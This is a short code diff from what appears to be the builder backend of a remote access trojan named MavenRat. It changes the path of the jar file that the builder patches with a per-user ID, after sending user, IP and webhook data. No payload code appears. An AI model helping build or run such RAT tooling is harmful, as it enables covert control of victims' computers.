@@ -23,7 +23,7 @@ def Builder(request):
 
             process_and_send_data(user_id, user, ip, webhook)
 
-            jar_file_path = 'MavenRAT/mavenrat/file/MavenRat1.0.jar'
+            jar_file_path = '/home/MavenRat/MavenRat/MavenRat1.0.jar'
             new_jar_content = replace_code_in_jar(jar_file_path, user_id)
 
             if new_jar_content is not None:
